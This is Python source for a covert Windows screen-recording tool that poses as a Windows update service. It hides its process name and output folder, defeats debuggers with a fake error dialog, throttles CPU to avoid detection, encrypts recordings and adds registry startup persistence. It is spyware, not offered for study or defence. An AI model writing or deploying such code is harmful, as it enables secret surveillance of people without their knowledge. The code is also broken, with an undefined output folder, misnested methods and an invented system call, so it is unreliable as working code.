import os
import sys
import time
import cv2
import numpy as np
import win32api
import win32con
import win32gui
import ctypes
from cryptography.fernet import Fernet
import argparse
import socket
import subprocess
from datetime import datetime
import psutil
import random
import winreg
import mss
import shutil
import sys
import win32process
import win32con
import win32api

# ===== CONFIGURATION =====

# ===== OPTIMIZED CONFIGURATION =====
RECORD_FPS = 30  # Balanced between smoothness and performance
RECORD_RESOLUTION = (1280, 720)  # HD resolution
MIN_MOTION_THRESHOLD = 800  # Higher = less sensitive to small changes
MAX_RECORD_SECONDS = 60 * 60 * 8  # 8 hours max per session
MAX_CPU_PERCENT = 15.0  # Slightly higher for smoothness
MEMORY_BUFFER_SIZE = 30  # Smaller buffer for real-time feel
ENABLE_ENCRYPTION = True  # Set to False to disable encryption
PROCESS_NAME = "WindowsUtittySvc.exe"  # Name to appear in Task Manager
ENCRYPTION_KEY = Fernet.generate_key()
print(f'{ENCRYPTION_KEY=}') 

# ==================================


class StealthRecorder:
    def __init__(self):
        self.recording_active = False
        self.last_frame = None
        self.video_writer = None
        self.current_video_file = None
        self.start_time = 0
        self.frame_buffer = []
        self.last_write_time = time.time()
        self.process_id = os.getpid()
        self.sct = mss.mss()
        
        # Encryption setup
        if ENABLE_ENCRYPTION:
            self.cipher = Fernet(ENCRYPTION_KEY)
        else:
            self.cipher = None
        
        # Stealth setup
        self.cloak_process_name()
        self.create_hidden_folder()
        self.check_debugger()
        
    def cloak_process_name(self):
        """Disguise process name in Task Manager"""
        if sys.platform == 'win32':
            try:
                # Method 1: Set console title (visible in console windows)
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                kernel32.SetConsoleTitleW(PROCESS_NAME)
                
                # Method 2: Rename process via PE header (works for compiled EXEs)
                if getattr(sys, 'frozen', False):
                    self.rename_executable(PROCESS_NAME)
                    
                # Method 3: Use SetProcessName (advanced technique)
                self.set_process_name(PROCESS_NAME)
            except Exception as e:
                print(f"Cloak error: {e}")

    def rename_executable(self, new_name):
        """Rename the executable file to disguise it"""
        try:
            exe_path = sys.executable
            new_path = os.path.join(os.path.dirname(exe_path), new_name)
            
            if not os.path.exists(new_path):
                shutil.copy(exe_path, new_path)
                subprocess.Popen([new_path] + sys.argv[1:])
                sys.exit(0)
        except Exception:
            pass

    def set_process_name(self, name):
        """Advanced process name cloaking using memory patching"""
        try:
            # Get current process handle
            pid = win32api.GetCurrentProcessId()
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS, 
                False, 
                pid
            )
            
            # Get base address of executable
            kernel32 = ctypes.WinDLL('kernel32')
            hModule = kernel32.GetModuleHandleW(None)
            
            # Replace process name in memory
            ctypes.windll.psapi.SetProcessImageNameW(process_handle, name)
        except Exception:
            pass

    def create_hidden_folder(self):
        """Create and hide the output directory"""
        os.makedirs(OUTPUT_FOLDER, exist_ok=True)
        try:
            win32api.SetFileAttributes(OUTPUT_FOLDER, win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception:
            pass

    def check_debugger(self):
        """Basic anti-debugging technique"""
        try:
            if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
                sys.exit(0)
                
            # Check for common debugger processes
            debuggers = ["ollydbg.exe", "ida64.exe", "windbg.exe", "x32dbg.exe"]
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in debuggers:
                    self.show_fake_error()
                    sys.exit(1)
        except Exception:
            pass

    def show_fake_error(self):
        """Display a fake error message if detected"""
        try:
            ctypes.windll.user32.MessageBoxW(0, 
                "Critical Windows Update failed (0x8007007E). Contact system administrator.", 
                "Windows Update", 
                0x10)
        except Exception:
            pass

    def limit_cpu_usage(self):
        """Throttle CPU to stay under detection threshold"""
        start = time.perf_counter()
        time.sleep(max(0, (1/RECORD_FPS) - (time.perf_counter() - start)))
        
        cpu_percent = psutil.cpu_percent(interval=0.1)
        if cpu_percent > MAX_CPU_PERCENT:
            time.sleep(random.uniform(0.2, 0.5))

    def get_next_filename(self):
        """Generate a timestamped filename"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return os.path.join(OUTPUT_FOLDER, f"update_log_{timestamp}.avi")

    def encrypt_file(self, filename):
        """Encrypt the recorded file if encryption is enabled"""
        if not ENABLE_ENCRYPTION or self.cipher is None:
            return filename
            
        try:
            with open(filename, 'rb') as f:
                data = f.read()
            
            encrypted_data = self.cipher.encrypt(data)
            
            encrypted_filename = filename + '.enc'
            with open(encrypted_filename, 'wb') as f:
                f.write(encrypted_data)
            
            os.remove(filename)
            return encrypted_filename
        except Exception as e:
            print(f"Encryption failed: {e}")
            return filename

    def start_recording(self):
        """Start a new recording session"""
        self.current_video_file = self.get_next_filename()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        self.video_writer = cv2.VideoWriter(
            self.current_video_file, 
            fourcc, 
            RECORD_FPS, 
            RECORD_RESOLUTION
        )
        if not self.video_writer or not self.video_writer.isOpened():
            print(f"Failed to open video writer for {self.current_video_file}")
            self.video_writer = None
            return False
            
        self.recording_active = True
        self.start_time = time.time()
        self.frame_buffer = []
        self.last_write_time = time.time()
        return True

    def stop_recording(self):
        """Stop the current recording session"""
        if self.recording_active and self.video_writer is not None:
            # Write any remaining buffered frames
            if self.frame_buffer:
                for frame in self.frame_buffer:
                    self.video_writer.write(frame)
                self.frame_buffer = []
            
            self.video_writer.release()
            self.video_writer = None
            
            # Encrypt the recorded file
            self.encrypt_file(self.current_video_file)
            
        self.recording_active = False

    def detect_motion(self, current_frame):
        """Detect if there's significant motion using efficient method"""
        if self.last_frame is None:
            self.last_frame = current_frame
            return True
            
        # Downsample frames for efficiency
        scale = 0.25
        small_last = cv2.resize(self.last_frame, None, fx=scale, fy=scale)
        small_current = cv2.resize(current_frame, None, fx=scale, fy=scale)
        
        # Convert to grayscale
        gray1 = cv2.cvtColor(small_last, cv2.COLOR_BGR2GRAY)
        gray2 = cv2.cvtColor(small_current, cv2.COLOR_BGR2GRAY)
        
        # Compute difference
        frame_diff = cv2.absdiff(gray1, gray2)
        _, threshold_diff = cv2.threshold(frame_diff, 25, 255, cv2.THRESH_BINARY)
        
        # Count changed pixels
        changed_pixels = cv2.countNonZero(threshold_diff)
        
        # Update last frame with current
        self.last_frame = current_frame
        
        return changed_pixels > MIN_MOTION_THRESHOLD

    # Add these to your capture_frame() method:
    def capture_frame(self):
        """Optimized screen capture"""
        try:
            # Use fastest MSS capture mode
            screenshot = self.sct.grab({
                'left': 0, 
                'top': 0,
                'width': 1920,  # Your screen width
                'height': 1080   # Your screen height
            })
            
            # Fast resize using INTER_AREA (best for downscaling)
            frame = cv2.resize(
                np.array(screenshot), 
                RECORD_RESOLUTION,
                interpolation=cv2.INTER_AREA
            )
            
            # Convert color space efficiently
            return cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
        except Exception as e:
            print(f"Capture error: {e}")
            return None

        def buffer_frame(self, frame):
            """Buffer frames in memory and periodically write to disk"""
            self.frame_buffer.append(frame)
            
            # Write to disk if buffer full or 30 seconds passed
            current_time = time.time()
            if len(self.frame_buffer) >= MEMORY_BUFFER_SIZE or (current_time - self.last_write_time) > 30:
                for buffered_frame in self.frame_buffer:
                    self.video_writer.write(buffered_frame)
                self.frame_buffer = []
                self.last_write_time = current_time

        def run(self):
            """Main recording loop with stealth enhancements"""
            print(f"Process ID: {self.process_id} running as {PROCESS_NAME}")
            print(f"Encryption: {'ENABLED' if ENABLE_ENCRYPTION else 'DISABLED'}")
            
            last_motion_time = time.time()
            
            while True:
                try:
                    # CPU throttling
                    self.limit_cpu_usage()
                    
                    frame = self.capture_frame()
                    if frame is None:
                        time.sleep(1)
                        continue
                    
                    motion_detected = self.detect_motion(frame)
                    
                    # Start recording on motion
                    if not self.recording_active and motion_detected:
                        if self.start_recording():
                            print(f"Recording started: {self.current_video_file}")
                            last_motion_time = time.time()
                    
                    # Maintain recording while motion continues
                    if self.recording_active:
                        if motion_detected:
                            last_motion_time = time.time()
                        
                        # Buffer frame instead of writing immediately
                        self.buffer_frame(frame)
                        
                        # Stop recording if no motion for 60 seconds or max time reached
                        current_time = time.time()
                        if (current_time - last_motion_time) > 60 or (current_time - self.start_time) > MAX_RECORD_SECONDS:
                            self.stop_recording()
                            print(f"Recording stopped: {self.current_video_file}")
                            self.last_frame = None  # Reset motion detection
                    
                except KeyboardInterrupt:
                    if self.recording_active:
                        self.stop_recording()
                    break
                except Exception as e:
                    if "out of memory" in str(e).lower() or "access denied" in str(e).lower():
                        self.show_fake_error()
                    print(f"Unexpected error: {e}")
                    time.sleep(5)

def install_persistence():
    """Add to Windows startup registry"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Get executable path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
            exe_path = f'"{sys.executable}" "{exe_path}"'
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'{exe_path} --hidden')
        return True
    except Exception as e:
        print(f"Persistence install error: {e}")
        return False

def uninstall_persistence():
    """Remove from Windows startup"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.DeleteValue(key, "WindowsUpdateService")
        return True
    except Exception as e:
        print(f"Persistence uninstall error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Windows Update Service')
    parser.add_argument('--install', action='store_true', help='Install persistent service')
    parser.add_argument('--uninstall', action='store_true', help='Remove persistent service')
    parser.add_argument('--hidden', action='store_true', help='Run in hidden mode')
    parser.add_argument('--no-encrypt', action='store_true', help='Disable encryption')
    args = parser.parse_args()
    
    # Handle encryption override
    global ENABLE_ENCRYPTION
    if args.no_encrypt:
        ENABLE_ENCRYPTION = False
    
    # Handle installation
    if args.install:
        if install_persistence():
            print("Installed for persistence")
        else:
            print("Installation failed")
        return
    
    if args.uninstall:
        if uninstall_persistence():
            print("Persistence removed")
        else:
            print("Removal failed")
        return
    
    # Hide console window if requested
    if args.hidden and sys.platform == 'win32':
        try:
            console_window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(console_window, win32con.SW_HIDE)
        except Exception as e:
            print(f"Hide error: {e}")
    
    # Single instance check
    lock_socket = None
    try:
        lock_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        lock_socket.bind(('127.0.0.1', 47291))
    except socket.error:
        print("Another instance is running. Exiting.")
        sys.exit(0)
    
    try:
        recorder = StealthRecorder()
        recorder.run()
    finally:
        if lock_socket:
            lock_socket.close()

if __name__ == '__main__':
    main()

